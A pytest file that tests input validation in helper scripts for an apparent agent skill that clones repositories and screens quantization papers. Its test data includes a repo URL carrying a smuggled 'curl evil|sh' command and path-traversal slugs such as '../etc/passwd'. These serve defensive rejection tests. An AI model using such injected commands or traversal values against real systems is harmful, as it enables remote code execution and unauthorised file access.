"""Offline tests for gather skill helper scripts."""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / ".agents" / "skills" / "_shared" / "scripts"


def _run(script: str, args: list[str], *, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-B", str(SCRIPTS / script), *args],
        capture_output=True,
        text=True,
        env=env or os.environ.copy(),
    )


def test_clone_rejects_non_github_url():
    result = _run("clone.py", ["--slug", "awq", "--repo-url", "https://evil.com/a/b"])
    assert result.returncode != 0
    payload = json.loads(result.stdout)
    assert payload["status"] == "error"
    assert "not a plain GitHub repo URL" in payload["error"]


def test_clone_rejects_gitlab_and_shell_metacharacters():
    for url in (
        "https://gitlab.com/owner/repo",
        "https://github.com/x/y; curl evil|sh",
        "git@github.com:owner/repo.git",
    ):
        result = _run("clone.py", ["--slug", "awq", "--repo-url", url])
        assert result.returncode != 0, url
        payload = json.loads(result.stdout)
        assert payload["status"] == "error"
        assert "not a plain GitHub repo URL" in payload["error"]


def test_request_json_missing_fields(tmp_path):
    sys.path.insert(0, str(SCRIPTS))
    import request as request_mod  # noqa: E402

    path = tmp_path / "incomplete.json"
    path.write_text(json.dumps({"method_name": "AWQ", "model_id": "org/model"}) + "\n")
    with pytest.raises(ValueError, match="missing"):
        request_mod.load_request(path)

    result = _run("request.py", [str(path)])
    assert result.returncode != 0
    combined = result.stderr + result.stdout
    assert "missing" in combined


def test_refuse_qat_training_only(tmp_path):
    paper = tmp_path / "qat.txt"
    paper.write_text(
        "LLM-QAT is a quantization-aware training method. The network is trained from "
        "scratch with QAT; it is not a post-training quantization method and cannot "
        "quantize an existing checkpoint.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "qat_training_only"


def test_refuse_kv_cache_only(tmp_path):
    paper = tmp_path / "kivi.txt"
    paper.write_text(
        "KIVI performs runtime KV-cache quantization. It does not reduce model weight "
        "memory and does not save quantized weights. This is orthogonal to weight "
        "quantization.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "kv_cache_only"


def test_refuse_bitnet_1_58_llama_quant(tmp_path):
    paper = tmp_path / "bitnet.txt"
    paper.write_text(
        "BitNet b1.58 trains 1.58-bit ternary weights for Llama from scratch. "
        "It is not a way to quantize an existing Llama checkpoint.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "bitnet_1_58"


def test_refuse_allows_ptq_weight_paper(tmp_path):
    paper = tmp_path / "awq.txt"
    paper.write_text(
        "AWQ is a post-training weight quantization method for LLMs. "
        "Activation-aware scaling protects salient channels. No training is required.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["status"] == "ok"


def test_request_write_rejects_unsafe_slug_and_secret_keys(tmp_path, monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import request as request_mod  # noqa: E402
    import paths as paths_mod  # noqa: E402

    monkeypatch.setattr(request_mod, "REQUESTS_ROOT", tmp_path)
    monkeypatch.setattr(paths_mod, "REQUESTS_ROOT", tmp_path)
    with pytest.raises(ValueError, match="invalid slug"):
        request_mod.write_request({"slug": "../etc/passwd", "method_name": "AWQ"})
    with pytest.raises(ValueError, match="secret-like"):
        request_mod.write_request({"slug": "awq-qwen", "HF_TOKEN": "hf_xxx"})
        with pytest.raises(ValueError, match="unsupported keys"):
            request_mod.write_request({"slug": "awq-qwen", "notes": "nope"})


def test_require_slug_blocks_venv_escape():
    sys.path.insert(0, str(SCRIPTS))
    import paths as paths_mod  # noqa: E402

    with pytest.raises(ValueError, match="invalid slug"):
        paths_mod.venv_python("/tmp/pwn")
    with pytest.raises(ValueError, match="invalid slug"):
        paths_mod.venv_python("../etc")

